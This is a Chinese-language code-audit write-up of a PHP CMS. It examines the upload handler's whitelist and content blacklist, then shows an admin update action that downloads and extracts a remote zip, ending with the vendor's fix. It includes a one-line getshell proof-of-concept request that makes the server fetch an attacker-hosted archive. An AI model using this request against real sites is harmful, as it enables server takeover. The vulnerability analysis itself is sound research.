### 前置知识

在分析审计代码之前先来看一下index.php文件中的代码，对CMS的路由等有个了解  
`index.php`  
前面代码部分会对一些类进行加载校验，诸如数据库连接等类。这里会对`front`类进行实例化并调用类中的`dispatch`方法，跟进代码来仔细看一下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1ae6d0271b9215ade38d5c49450291bd49cb56fa.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1ae6d0271b9215ade38d5c49450291bd49cb56fa.png)  
`/lib/tool/front_class.php`  
`dispatch`方法会对类是否存在进行一个校验，如果类不存在直接抛出异常，`$case`变量以及`$act`都是通过GET方式进行获取的，之后会对`$act`进行一个拼接赋值给`$method`，之后去类中寻找对应的方法，如果存在就可以调用类中的方法，不存在就会抛出异常  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1a463eece1f3fc4c14f4d4b8af8ed4eaa9f5c72d.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1a463eece1f3fc4c14f4d4b8af8ed4eaa9f5c72d.png)  
还需要注意的是后台功能模块或是调用类中方法的时候都会自带两个参数`site=default&admin_dir=admin`,这两个get参数部分功能点通过抓包能够看到，所以最好是在请求的时候自己写上

### upload

还是常规思路，先对存在上传的功能点进行分析。登录管理员后台，上传功能点有多个，这里对上传logo功能点进行尝试，设置-&gt;全局设置-&gt;网站logo，上传正常的图片同时进行抓包  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f9213ab07e22df1cc9f17a391a5251884af44753.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f9213ab07e22df1cc9f17a391a5251884af44753.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ae633504953d62652e51fe7a1e4ce47aab859d87.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ae633504953d62652e51fe7a1e4ce47aab859d87.png)  
能够正常上传图片，修改后缀为PHP上传失败，常见的绕过方法都没有用，将请求转换成表单的形式也没有办法进行上传，根据前面提到调用的方法形式，来找到类以及类中的方法进行审计  
`/lib/default/tool_act.php#556`

```php
    function uploadimage3_action()
    {
        $res = array();
        $uploads = array();
        if (is_array($_FILES)) {
            $upload = new upload();
            $upload->dir = 'images';
            $upload->max_size = config::get('upload_max_filesize') * 1024 * 1024;
            $_file_type = str_replace(',', '|', config::get('upload_filetype'));
            foreach ($_FILES as $name => $file) {
                $res[$name]['size'] = ceil($file['size'] / 1024);
                if ($file['size'] > $upload->max_size) {
                    $res[$name]['code'] = "1";
                    $res[$name]['msg'] = lang('attachment_exceeding_the_upper_limit') . "(" . ceil($upload->max_size / 1024) . "K)！";
                    break;
                }
                if (!front::checkstr(file_get_contents($file['tmp_name']))) {
                    $res[$name]['code'] = "2";
                    $res[$name]['msg'] = lang('upload_failed_attachment_is_not_verified');
                    break;
                }
                if (!$file['name'] || !preg_match('/\.(' . $_file_type . ')$/', $file['name']))
                    continue;
                $uploads[$name] = $upload->run($file);
                if (!$uploads[$name]) {
                    $res[$name]['code'] = "3";
                    $res[$name]['msg'] = lang('attachment_save_failed');
                    break;
                }
                $str = (config::get('base_url')==""?"":config::get('base_url')) .$uploads[$name];
                $res[$name]['name'] = $str;
                $res[$name]['type'] = $file['type'];
                $res[$name]['code'] = "0";
                apps::updateimg($uploads[$name],ROOT.$str);
            }
        }
        echo json::encode($res);
    }
```

`uploadimage3_action`方法对上传的文件进行了处理，首先对文件类型、大小等进行了获取，并从已申明的常量中获取了允许上传的文件类型即文件名后缀，也就是说这里做了白名单校验，只有在白名单当中的文件才能够上传成功；之后调用了`front`类中的`checkstr`方法对文件内容进行了校验，跟进一下方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-797c2fa0533913a95c9e18eec5d272d1806704ec.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-797c2fa0533913a95c9e18eec5d272d1806704ec.png)  
`checkstr`方法写了一个黑名单匹配规则，只要匹配到黑名单当中的字符串内容，就直接返回`false`，那么也无法成功上传，这样子图片马必须采用短标签的形式进行写入，利用的前提是php的配置解析短标签，并且存在可控的文件包含点  
之后对文件后缀进行校验，如果符合要求就会调用`upload`类中`run`方法进行文件存储路径的创建  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ebac6cef548363e3fe7a02d8463505a5272767eb.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ebac6cef548363e3fe7a02d8463505a5272767eb.png)  
下面通过调试直接输出一些变量值  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4cafcadbc61eb65a256debfa09d8aa87f96ee230.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4cafcadbc61eb65a256debfa09d8aa87f96ee230.png)  
可以看到允许上传的所有文件类型，以及对文件处理之后生成的绝对存储路径，这里看到允许上传压缩包的时候想到了之前审计的`CMS`，`getshell`的方法就是通过在压缩包中放入shell文件，之后cms进行解压缩操作，已知上传之后的路径；那么接下来就需要找到对压缩包进行解压缩操作的方法  
`lib/plugins/filecheck/tool/phpzip#unzip`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8f5e2e516e92824f023f5e04fe0b565e3ef98f07.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8f5e2e516e92824f023f5e04fe0b565e3ef98f07.png)  
通过全局代码搜索找到unzip方法，但是index.php并不会包含该类，那么上传压缩包进行getshell的方法就不可行了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-827f699f5114b0c0fa1105579245304c5ba4aae5.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-827f699f5114b0c0fa1105579245304c5ba4aae5.png)  
看起来功能点结合getshell就到这里了。接下来转变一下思路，还记得之前审过的cms能够通过控制器调用方法远程下载vps上的文件，那么一样能够达到getshell的目的，那就跟着思路去找找看有没有类似的方法存在。  
全局搜索类似`function download，downfile`的关键词，找到了几处，经过审计确认其中一个可能可以满足需求  
`lib/admin/update_admin.php#85`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e470378e5d3f463de1d967bda02757b2bbe889b2.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e470378e5d3f463de1d967bda02757b2bbe889b2.png)  
通过调用`front`类的`get`方法获取`url`参数，之后调用本来中的`get_file`方法，跟进，这里就是对指定的文件进行了下载保存，那么应该可以远程下载我们的`shell`文件了；之后会调用`PclZip`类中的`extract`方法对上传的压缩包进行解压缩并对已经存在的文件进行覆盖，下面的代码还会对指定的`sql`文件进行覆盖并重新加载`sql`文件，那么可以在数据库文件插入恶意代码进行`getshell`，这里没有深入探究。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7b01d7948f0b2638260eb234024036d350b172f0.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7b01d7948f0b2638260eb234024036d350b172f0.png)  
根据前面分析的，可以构造出如下的poc

```php
case=update&act=downfile&site=default&admin_dir=admin&url=http://xxxx/xx.zip
```

成功getshell  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-bb1beceef96a9d0dbefc14a5fcb53a0da91b4aa3.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-bb1beceef96a9d0dbefc14a5fcb53a0da91b4aa3.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-566a6009c3074e3fd9dcf86d2f8eecefd99578eb.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-566a6009c3074e3fd9dcf86d2f8eecefd99578eb.png)

### 漏洞修复

审计的CMS并不是最新版的，看了最新版的，已经对此处的漏洞进行了修复。修复代码如下：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8cd0aa082dad1c77358df3df9876bdb065c42e60.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8cd0aa082dad1c77358df3df9876bdb065c42e60.png)  
跟一下，可以发现其实是对url进行了解密处理，该类中还有一个加密函数，其实这算是另类的修复方案？未使用加密方法对url处理，那么解密之后url自然也就乱码了，乱码的地址当然也就不能访问到要下载的文件了，挺绝的...  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7906d277b5ec238556c6b0f9936fc424e47cbf65.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7906d277b5ec238556c6b0f9936fc424e47cbf65.png)